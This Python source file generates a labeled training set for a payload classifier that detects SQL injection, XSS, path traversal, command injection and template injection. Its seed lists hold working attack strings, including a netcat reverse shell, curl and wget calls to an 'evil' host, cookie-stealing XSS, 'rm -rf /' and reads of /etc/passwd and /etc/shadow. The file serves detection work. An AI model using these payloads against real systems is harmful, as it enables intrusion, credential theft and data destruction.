"""Generate a labeled char-level dataset for the M1 payload classifier.

Self-contained and reproducible: curated seed payloads for each attack family
are expanded with realistic mutations (encoding, case, comment insertion,
whitespace), and a benign corpus is synthesized from the kinds of values real
HTTP parameters and bodies carry. A separate obfuscated split is produced for a
robustness check the training split never sees.
"""

from __future__ import annotations

import random
import urllib.parse

LABELS = ["benign", "sqli", "xss", "traversal", "cmdi", "ssti"]
LABEL_INDEX = {name: i for i, name in enumerate(LABELS)}

_SQLI = [
    "1' OR '1'='1", "' OR 1=1--", "admin'--", "1 UNION SELECT username,password FROM users",
    "1; DROP TABLE users;--", "' OR 'x'='x", "1) OR (1=1", "'; EXEC xp_cmdshell('dir')--",
    "1 AND SLEEP(5)", "' UNION SELECT NULL,NULL,version()--", "0x27 OR 1=1", "1' AND 1=CONVERT(int,@@version)--",
    "') OR ('1'='1", "1 OR 1=1 LIMIT 1", "'; WAITFOR DELAY '0:0:5'--", "1'||'1'='1",
    "UNION ALL SELECT table_name FROM information_schema.tables", "1' GROUP BY 1--", "' OR SLEEP(5)#",
    "1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x3a,version())),1)",
    "1 AND (SELECT COUNT(*) FROM information_schema.columns)>0",
    "1' AND EXTRACTVALUE(1,CONCAT(0x5c,database()))-- -",
    "1 AND 1=CONVERT(int,(SELECT @@version))",
    "1) UNION ALL SELECT NULL,CONCAT(user(),0x3a,version()),NULL-- -",
]
_XSS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(document.cookie)",
    "<svg/onload=alert(1)>", "\"><script>alert(String.fromCharCode(88))</script>", "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>", "<a href=javascript:alert(1)>x</a>", "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>", "<img src=1 onerror=\"fetch('//evil/'+document.cookie)\">",
    "<script>document.location='//evil/'+document.cookie</script>", "onmouseover=alert(1)",
    "<video><source onerror=alert(1)>", "<marquee onstart=alert(1)>",
]
_TRAVERSAL = [
    "../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "../../../../../../etc/shadow",
    "....//....//etc/passwd", "/var/www/../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
    "../../boot.ini", "file:///etc/passwd", "../../../proc/self/environ",
]
_CMDI = [
    "; cat /etc/passwd", "| whoami", "`id`", "$(curl http://evil/x)", "; rm -rf /", "&& wget http://evil/sh",
    "| nc -e /bin/sh 10.0.0.1 4444", "; ping -c1 evil.com", "$(cat /etc/passwd)", "`wget evil`",
    "|| bash -i", "; python -c 'import os'", "& type C:\\boot.ini",
]
_SSTI = [
    "{{7*7}}", "${7*7}", "#{7*7}", "{{config.items()}}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{''.__class__.__mro__[1].__subclasses__()}}", "<%= 7*7 %>", "{{request.application}}",
    "#{session}", "${{7*7}}",
]

_WORDS = ("apple banana laptop wireless headphones cotton shirt bread weather order iphone "
    "review product price sale menu category plan account settings password reset delivery "
    "photo album beach meeting tuesday invoice engineer senior report summary chart dashboard "
    "green tea coffee downtown museum ticket flight hotel booking refund tracking number size "
    "color blue red medium large discount coupon cart checkout shipping address city country "
    "profile avatar upload download document folder project client customer vendor supplier "
    "quarterly revenue growth strategy roadmap release feature bug fix commit branch merge").split()

_FIRST = "John Mary Ahmed Wei Priya Olga Carlos Yuki Fatima Liam".split()
_LAST = "Smith Obrien Zhang Patel Nguyen Muller Garcia Kim Okafor Rossi".split()
_TLD = ["com", "org", "net", "co.uk", "io", "in"]

# Hard negatives: benign text that shares characters/tokens with attacks so the
# model learns the boundary instead of keying on punctuation alone.
_HARD_NEGATIVES = [
    "a && b are both true", "if (x > 0 && y < 10) return", "3+4*2 = 11", "price: $5 | $10 | $20",
    "SELECT your preferred option", "drop-down list of countries", "union of two sets A and B",
    "O'Brien's order", "it's a user's choice", "path/to/my/file.txt", "src/main/app.py",
    "C:\\Users\\Public", "cat and dog photos", "list all items", "id number is 12345",
    "the script for the play", "onboarding checklist", "5 < 10 and 10 > 5", "x = (a+b)/c",
    "email: name@host.com", "visit https://example.com/path?ref=1", "quote: \"hello there\"",
    "1=1 is always true in math", "or maybe later", "and then we left", "insert coin to play",
    "delete this note", "update your profile", "select * from the dropdown", "where is my order",
    "<b>bold</b> not allowed in names", "use --flag for help", "run make && test", "grep the logs",
    "version 4.14.0 released", "0x1F3 hex color", "semicolon; separated; values", "back-tick `code`",
]


def _rand_token(rng):
    import string
    alphabet = string.ascii_letters + string.digits
    return "".join(rng.choice(alphabet) for _ in range(rng.randint(4, 24)))


def _benign(rng):
    kind = rng.random()
    if kind < 0.22:
        return " ".join(rng.sample(_WORDS, k=rng.randint(1, 6)))
    if kind < 0.34:
        return rng.choice(_HARD_NEGATIVES)
    if kind < 0.44:
        name = f"{rng.choice(_FIRST)} {rng.choice(_LAST)}"
        return name if rng.random() < 0.5 else name.lower().replace(" ", ".") + "@example." + rng.choice(_TLD)
    if kind < 0.56:
        return str(rng.randint(0, 10_000_000)) if rng.random() < 0.5 else f"{rng.uniform(0,9999):.2f}"
    if kind < 0.66:
        return _rand_token(rng)
    if kind < 0.76:
        page = "/".join(rng.sample(_WORDS, k=rng.randint(1, 3)))
        return f"https://{rng.choice(_WORDS)}.example.{rng.choice(_TLD)}/{page}?ref={rng.randint(1,999)}"
    if kind < 0.85:
        return "/".join(rng.sample(_WORDS, k=rng.randint(1, 4))) + rng.choice([".jpg", ".pdf", ".txt", "/", ""])
    if kind < 0.93:
        return '{"%s":"%s","n":%d}' % (rng.choice(_WORDS), " ".join(rng.sample(_WORDS, 2)), rng.randint(1, 99))
    return f"{rng.randint(2020,2026)}-{rng.randint(1,12):02d}-{rng.randint(1,28):02d}"


def _mutate(payload: str, rng: random.Random) -> str:
    """Decoding-invariant mutations only.

    The engine URL-decodes every value before scoring, so the model is trained on
    the canonical (decoded) form and never on percent-encoding. Evasion by
    encoding is handled by the engine decoder, not the model. Mutations here
    (case, whitespace, comments, surrounding noise) preserve that canonical form.
    """
    out = payload
    if rng.random() < 0.30 and any(c.isalpha() for c in out):
        out = "".join(c.upper() if rng.random() < 0.5 else c for c in out)
    if rng.random() < 0.25:
        out = out.replace(" ", rng.choice(["  ", "\t", "/**/"]))
    if rng.random() < 0.30:
        # Benign-looking surrounding noise only; attack-specific tails like
        # comment markers already live in the seeds, so we do not add them here
        # (doing so blurred the boundary with benign arithmetic).
        prefix = rng.choice(["", "q=", "id=", "name=", "search="])
        out = prefix + out
    return out


def _expand(seeds: list[str], label: str, n: int, rng: random.Random) -> list[tuple[str, int]]:
    rows = []
    for _ in range(n):
        base = rng.choice(seeds)
        rows.append((_mutate(base, rng), LABEL_INDEX[label]))
    return rows


def build(seed: int = 1337, per_attack: int = 3000, benign: int = 15000):
    rng = random.Random(seed)
    rows: list[tuple[str, int]] = []
    for label, seeds in [("sqli", _SQLI), ("xss", _XSS), ("traversal", _TRAVERSAL),
                         ("cmdi", _CMDI), ("ssti", _SSTI)]:
        rows += _expand(seeds, label, per_attack, rng)
    rows += [(_benign(rng), LABEL_INDEX["benign"]) for _ in range(benign)]
    rng.shuffle(rows)
    return rows


def obfuscated_eval(seed: int = 999, per_attack: int = 400, benign: int = 1200):
    """A held-out set skewed toward heavy encoding/casing, for robustness."""
    rng = random.Random(seed)
    rows: list[tuple[str, int]] = []
    for label, seeds in [("sqli", _SQLI), ("xss", _XSS), ("traversal", _TRAVERSAL),
                         ("cmdi", _CMDI), ("ssti", _SSTI)]:
        for _ in range(per_attack):
            base = rng.choice(seeds)
            # Simulate the engine: encode, then decode back (as the engine does),
            # plus case noise. Standard percent-encoding round-trips to canonical.
            enc = urllib.parse.quote(base, safe="")
            decoded = urllib.parse.unquote_plus(enc)
            if rng.random() < 0.5:
                decoded = "".join(c.upper() if rng.random() < 0.5 else c for c in decoded)
            rows.append((decoded, LABEL_INDEX[label]))
    rows += [(_benign(rng), LABEL_INDEX["benign"]) for _ in range(benign)]
    rng.shuffle(rows)
    return rows
